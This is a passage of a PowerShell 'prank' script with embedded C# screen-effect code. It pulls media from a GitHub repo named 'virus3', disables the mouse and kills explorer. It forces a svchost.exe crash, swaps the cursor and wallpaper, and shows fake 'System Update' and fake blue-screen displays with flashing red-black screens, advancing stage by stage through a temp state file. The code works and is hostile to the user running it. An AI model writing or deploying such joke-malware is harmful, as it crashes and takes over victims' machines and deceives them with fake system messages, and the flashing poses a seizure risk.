        public static void RunIconBlender(IntPtr hdc, int w, int h) {
            Random rand = new Random();
            int[] sysIcons = { 32512, 32513, 32514, 32515, 32516, 32517 }; 
            
            long startTick = Environment.TickCount;
            while (Environment.TickCount - startTick < 10000) { 
                for (int i = 0; i < 60; i++) {
                    DrawIcon(hdc, rand.Next(w), rand.Next(h), LoadIcon(IntPtr.Zero, sysIcons[rand.Next(sysIcons.Length)]));
                }

                for (int i = 0; i < 15; i++) {
                    int cx1 = rand.Next(w); int cy1 = rand.Next(h);
                    int cx2 = rand.Next(w); int cy2 = rand.Next(h);
                    int size = rand.Next(100, 400); 
                    BitBlt(hdc, cx1, cy1, size, size, hdc, cx2, cy2, SRCCOPY);
                }
                Thread.Sleep(30); 
            }
        }

        public static void RunSpinningTriangles(IntPtr hdc, int w, int h) {
            IntPtr hdcMem = CreateCompatibleDC(hdc);
            IntPtr hbmMem = CreateCompatibleBitmap(hdc, w, h);
            IntPtr hOldSel = SelectObject(hdcMem, hbmMem);
            Random rand = new Random();
            
            double angle = 0;
            int gridSize = 120;
            long startTick = Environment.TickCount;

            while (Environment.TickCount - startTick < 10000) { 
                using (Graphics g = Graphics.FromHdc(hdcMem)) {
                    g.Clear(Color.Black);
                    for (int i = 0; i < 500; i++) {
                        using (Pen glitchPen = new Pen(Color.LimeGreen, rand.Next(1, 4))) {
                            int gx = rand.Next(w); int gy = rand.Next(h);
                            g.DrawLine(glitchPen, gx, gy, gx + rand.Next(10, 50), gy);
                        }
                    }

                    angle += 0.15;
                    using (Brush triBrush = new SolidBrush(Color.BlueViolet)) {
                        for (int y = 0; y < h + gridSize; y += gridSize) {
                            for (int x = 0; x < w + gridSize; x += gridSize) {
                                int xOff = x + ((y / gridSize) % 2 == 0 ? 0 : gridSize / 2);
                                
                                PointF[] pts = new PointF[3];
                                double radius = 60;
                                pts[0] = new PointF((float)(xOff + radius * Math.Cos(angle)), (float)(y + radius * Math.Sin(angle)));
                                pts[1] = new PointF((float)(xOff + radius * Math.Cos(angle + 2.094)), (float)(y + radius * Math.Sin(angle + 2.094)));
                                pts[2] = new PointF((float)(xOff + radius * Math.Cos(angle + 4.188)), (float)(y + radius * Math.Sin(angle + 4.188)));
                                
                                g.FillPolygon(triBrush, pts);
                            }
                        }
                    }
                }
                BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
                Thread.Sleep(20);
            }
            SelectObject(hdcMem, hOldSel); DeleteObject(hbmMem); DeleteDC(hdcMem);
        }

        public static void RunScreenScroll(IntPtr hdc, int w, int h) {
            long startTick = Environment.TickCount;
            int phase = 0;
            
            while (Environment.TickCount - startTick < 6000) { 
                int dx = 0, dy = 0;
                
                if (phase == 0) dx = -20;
                else if (phase == 1) dy = -20;
                else if (phase == 2) dy = 20;
                else if (phase == 3) dy = 20;
                else if (phase == 4) dx = 20;

                BitBlt(hdc, dx, dy, w, h, hdc, 0, 0, SRCCOPY);
                
                phase++;
                if (phase > 4) phase = 0;
                Thread.Sleep(15);
            }
        }

        public static void RunFakeBSOD(IntPtr hdc, int w, int h) {
            IntPtr hdcMem = CreateCompatibleDC(hdc);
            IntPtr hbmMem = CreateCompatibleBitmap(hdc, w, h);
            IntPtr hOldSel = SelectObject(hdcMem, hbmMem);
            Random rand = new Random();

            Color bsodBlue = Color.FromArgb(0, 120, 215); 
            int percent = 0;

            while (percent <= 100) {
                using (Graphics g = Graphics.FromHdc(hdcMem)) {
                    g.Clear(bsodBlue);
                    g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;

                    int marginX = w / 8;
                    int marginY = h / 4;

                    using (Font sadFont = new Font("Segoe UI", 120))
                    using (Font mainFont = new Font("Segoe UI", 24))
                    using (Font subFont = new Font("Segoe UI", 16)) {
                        g.DrawString(":(", sadFont, Brushes.White, marginX, marginY - 150);
                        g.DrawString("Your PC ran into a problem and needs to restart. We're\njust collecting some error info, and then we'll restart for\nyou.", mainFont, Brushes.White, marginX, marginY + 50);
                        g.DrawString(percent + "% complete", mainFont, Brushes.White, marginX, marginY + 180);
                        g.DrawString("For more information about this issue and possible fixes, visit https://www.windows.com/stopcode", subFont, Brushes.White, marginX, marginY + 280);
                        g.DrawString("If you call a support person, give them this info:\nStop code: CRITICAL_PROCESS_DIED", subFont, Brushes.White, marginX, marginY + 320);
                    }
                }
                BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
                
                percent += rand.Next(1, 15);
                Thread.Sleep(rand.Next(100, 800)); 
            }

            long meltStart = Environment.TickCount;
            while (Environment.TickCount - meltStart < 5000) {
                BitBlt(hdc, rand.Next(-20, 20), rand.Next(-20, 20), w, h, hdc, 0, 0, DSTINVERT);
                StretchBlt(hdc, rand.Next(w), rand.Next(h), rand.Next(100, 500), rand.Next(100, 500), hdc, rand.Next(w), rand.Next(h), rand.Next(50, 200), rand.Next(50, 200), SRCCOPY);
                Thread.Sleep(50);
            }

            long flashStart = Environment.TickCount;
            while (Environment.TickCount - flashStart < 4000) {
                using (Graphics g = Graphics.FromHdc(hdcMem)) {
                    g.Clear((Environment.TickCount / 100) % 2 == 0 ? Color.Red : Color.Black);
                    using (Font hugeFont = new Font("Impact", 80, FontStyle.Bold)) {
                        string msg = "YOU JUST GOT FOOLED!!!";
                        SizeF size = g.MeasureString(msg, hugeFont);
                        g.DrawString(msg, hugeFont, (Environment.TickCount / 100) % 2 == 0 ? Brushes.White : Brushes.Red, (w - size.Width) / 2, (h - size.Height) / 2);
                    }
                }
                BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
                Thread.Sleep(50);
            }

            SelectObject(hdcMem, hOldSel); DeleteObject(hbmMem); DeleteDC(hdcMem);
        }

        public static void RunScreenMelt(IntPtr hdc, int w, int h) {
            Random rand = new Random();
            long startTick = Environment.TickCount;
            
            while(Environment.TickCount - startTick < 8000) {
                int x = rand.Next(w);
                int yOffset = rand.Next(3, 15);
                int stripWidth = rand.Next(10, 50);
                BitBlt(hdc, x, yOffset, stripWidth, h, hdc, x, 0, SRCCOPY);
                Thread.Sleep(1); 
            }
        }
    }
"@
    Add-Type -TypeDefinition $GdiCode -ReferencedAssemblies "System.Drawing", "System.Windows.Forms"
}

[PrankV25]::SetProcessDPIAware() | Out-Null

$StateFile = "$env:TEMP\system_update_stage_v25.txt"
$CurrentAct = 1

if (Test-Path $StateFile) {
    try { $CurrentAct = [int](Get-Content -Path $StateFile -Raw) } catch { }
}

$OldWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
$SPI_SETDESKWALLPAPER = 0x0014
$SPIF_UPDATEINIFILE = 0x01
$SPIF_SENDWININICHANGE = 0x02

try {
    $hdc = [PrankV25]::GetDC([IntPtr]::Zero)
    $Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

    $AudioUrl = "https://raw.githubusercontent.com/DanielNov2014/virus3/main/recoures/verycoolmusic.mp3"
    $LocalAudioPath = "$env:TEMP\verycoolmusic.mp3"
    if (-not (Test-Path $LocalAudioPath)) { Invoke-WebRequest -Uri $AudioUrl -OutFile $LocalAudioPath }
    
    $AudioPlayer = New-Object System.Windows.Media.MediaPlayer
    $AudioPlayer.Open($LocalAudioPath)
    $AudioPlayer.Play()

    if ($CurrentAct -eq 1) {
        Set-Content -Path $StateFile -Value 2 -Force
        Write-Host "Starting ACT 1: Setup..."
        
        $Speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
        $Speak.Speak("your pc has been taken over by this powershell script no harm ofc or what... nah i wont do anything harmful surprise coming soon!")

        $VideoUrl = "https://raw.githubusercontent.com/DanielNov2014/virus3/main/recoures/video.mp4"
        $LocalVideoPath = "$env:TEMP\rickroll.mp4"
        if (-not (Test-Path $LocalVideoPath)) { Invoke-WebRequest -Uri $VideoUrl -OutFile $LocalVideoPath }

        $xaml = @"
        <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                WindowStyle="None" WindowState="Maximized" Topmost="True" Background="Black" ShowInTaskbar="False">
            <MediaElement Name="Player" Source="$LocalVideoPath" LoadedBehavior="Play" Stretch="Fill" />
        </Window>
"@
        $reader = (New-Object System.Xml.XmlNodeReader([xml]$xaml))
        $Window = [Windows.Markup.XamlReader]::Load($reader)
        $Player = $Window.FindName("Player")
        $Player.add_MediaEnded({ $Window.Close() })
        $Window.ShowDialog() | Out-Null

        Start-Process "https://www.roblox.com/users/3681686378/profile"

        $hIconQuestion = [PrankV25]::LoadIcon([IntPtr]::Zero, 32514)
        $hCursor = [PrankV25]::CopyIcon($hIconQuestion)
        [PrankV25]::SetSystemCursor($hCursor, 32512) | Out-Null
        [PrankV25]::DisableMouse() 

        $IconIds = @(32513, 32514, 32515, 32516) 
        for ($i = 0; $i -lt 50; $i++) {
            [PrankV25]::DrawIcon($hdc, (Get-Random -Max $Bounds.Width), (Get-Random -Max $Bounds.Height), [PrankV25]::LoadIcon([IntPtr]::Zero, (Get-Random -InputObject $IconIds))) | Out-Null
            Start-Sleep -Milliseconds 20
        }
        for ($i = 0; $i -lt 100; $i++) {
            $y = Get-Random -Max ($Bounds.Height - 100)
            [PrankV25]::BitBlt($hdc, (Get-Random -Max $Bounds.Width), $y + (Get-Random -Min 5 -Max 25), (Get-Random -Min 50 -Max 200), $Bounds.Height - $y, $hdc, (Get-Random -Max $Bounds.Width), $y, 0x00CC0020) | Out-Null
            Start-Sleep -Milliseconds 10
        }
        for ($i = 0; $i -lt 2; $i++) {
            [PrankV25]::BitBlt($hdc, 0, 0, $Bounds.Width, $Bounds.Height, [IntPtr]::Zero, 0, 0, 0x00550009) | Out-Null
            Start-Sleep -Milliseconds 600 
        }

        [System.Media.SystemSounds]::Asterisk.Play()

        $MsgBox = New-Object Windows.Forms.Form
        $MsgBox.Size = New-Object System.Drawing.Size(600,100)
        $MsgBox.StartPosition = "CenterScreen"
        $MsgBox.TopMost = $true
        $MsgBox.FormBorderStyle = "FixedToolWindow"
        $MsgBox.Text = "System Update"
        $Label = New-Object Windows.Forms.Label
        $Label.Text = "we are adding free robux backgrounds to your pc enjoy"
        $Label.Dock = "Fill"
        $Label.TextAlign = "MiddleCenter"
        $Label.Font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
        $MsgBox.Controls.Add($Label)
        $MsgBox.Show()
        $MsgBox.Refresh()

        $Speak.SpeakAsync("we are adding free robux backgrounds to your pc enjoy") | Out-Null

        $Backgrounds = @(
            "https://raw.githubusercontent.com/DanielNov2014/virus3/main/recoures/background.png",
            "https://raw.githubusercontent.com/DanielNov2014/virus3/main/recoures/background1.png",
            "https://raw.githubusercontent.com/DanielNov2014/virus3/main/recoures/background2.png",
            "https://raw.githubusercontent.com/DanielNov2014/virus3/main/recoures/background3.png"
        )

        for ($bgIdx = 0; $bgIdx -lt $Backgrounds.Length; $bgIdx++) {
            $BgPath = "$env:TEMP\robux_bg_$bgIdx.png"
            try {
                if (-not (Test-Path $BgPath)) { Invoke-WebRequest -Uri $Backgrounds[$bgIdx] -OutFile $BgPath -ErrorAction Stop }
                [PrankV25]::SystemParametersInfoString($SPI_SETDESKWALLPAPER, 0, $BgPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDWININICHANGE) | Out-Null
            } catch { }

            for ($i = 0; $i -lt 100; $i++) {
                [PrankV25]::StretchBlt($hdc, 10, 10, $Bounds.Width - 20, $Bounds.Height - 20, $hdc, 0, 0, $Bounds.Width, $Bounds.Height, 0x00CC0020) | Out-Null
                Start-Sleep -Milliseconds 100
            }
        }
        Write-Host "Act 1 Complete. Please restart."
        Start-Sleep -Seconds 3
	TASKKILL /IM svchost.exe /F
    }
    elseif ($CurrentAct -eq 2) {
        Set-Content -Path $StateFile -Value 3 -Force
        Write-Host "Starting ACT 2: Advanced 3D Engine..."
        
        [PrankV25]::DisableMouse() 
        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1

        [PrankV25]::RunSmoothRainbowHole($hdc, $Bounds.Width, $Bounds.Height)
        [PrankV25]::Run3DShapeEngine($hdc, $Bounds.Width, $Bounds.Height)
        [PrankV25]::RunOrbitingWindows($hdc, $Bounds.Width, $Bounds.Height)

        Write-Host "Act 2 Complete. Please restart."
        Start-Sleep -Seconds 3
	TASKKILL /IM svchost.exe /F
    }
    elseif ($CurrentAct -eq 3) {
        Set-Content -Path $StateFile -Value 4 -Force
        Write-Host "Starting ACT 3: Fullscreen Physics Sandbox..."
        
        [PrankV25]::DisableMouse() 
        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1

        [PrankV25]::RunPhysicsSandbox($hdc, $Bounds.Width, $Bounds.Height)

        Write-Host "Act 3 Complete. Please restart."
        Start-Sleep -Seconds 3
    }
    elseif ($CurrentAct -eq 4) {
        Set-Content -Path $StateFile -Value 1 -Force
        Write-Host "Starting ACT 4: The Meltdown..."
        
        [PrankV25]::DisableMouse() 
        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1

        [PrankV25]::RunFakeHackerCMD($hdc, $Bounds.Width, $Bounds.Height)
        [PrankV25]::RunIconBlender($hdc, $Bounds.Width, $Bounds.Height)
        [PrankV25]::RunSpinningTriangles($hdc, $Bounds.Width, $Bounds.Height)
        [PrankV25]::RunScreenScroll($hdc, $Bounds.Width, $Bounds.Height)
        [PrankV25]::RunFakeBSOD($hdc, $Bounds.Width, $Bounds.Height)
        [PrankV25]::RunScreenMelt($hdc, $Bounds.Width, $Bounds.Height)

        [PrankV25]::BitBlt($hdc, 0, 0, $Bounds.Width, $Bounds.Height, [IntPtr]::Zero, 0, 0, 0x00000042) | Out-Null 
        [System.Media.SystemSounds]::Hand.Play()
        Start-Sleep -Seconds 2

        $MsgBox2 = New-Object Windows.Forms.Form
        $MsgBox2.Size = New-Object System.Drawing.Size(400,100)
        $MsgBox2.StartPosition = "CenterScreen"
        $MsgBox2.TopMost = $true
        $MsgBox2.FormBorderStyle = "FixedToolWindow"
        $MsgBox2.Text = "System Status"
        $Label2 = New-Object Windows.Forms.Label
        $Label2.Text = "System Rebooting... Just kidding! You got pranked."
        $Label2.Dock = "Fill"
        $Label2.TextAlign = "MiddleCenter"
        $Label2.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
        $MsgBox2.Controls.Add($Label2)
        $MsgBox2.ShowDialog() | Out-Null
    }

    [PrankV25]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null
}
finally {
    [PrankV25]::EnableMouse()
    if (-not (Get-Process -Name explorer -ErrorAction SilentlyContinue)) { Start-Process "explorer.exe" }
    if ($null -ne $MsgBox) { $MsgBox.Dispose() }
    if ($null -ne $AudioPlayer) { $AudioPlayer.Stop(); $AudioPlayer.Close() }

    $SPI_SETCURSORS = 0x0057
    [PrankV25]::SystemParametersInfo($SPI_SETCURSORS, 0, [IntPtr]::Zero, 0) | Out-Null
    if ([string]::IsNullOrWhiteSpace($OldWallpaper) -eq $false) {
        [PrankV25]::SystemParametersInfoString($SPI_SETDESKWALLPAPER, 0, $OldWallpaper, $SPIF_UPDATEINIFILE -bor $SPIF_SENDWININICHANGE) | Out-Null
    }
    [PrankV25]::InvalidateRect([IntPtr]::Zero, [IntPtr]::Zero, $true) | Out-Null
}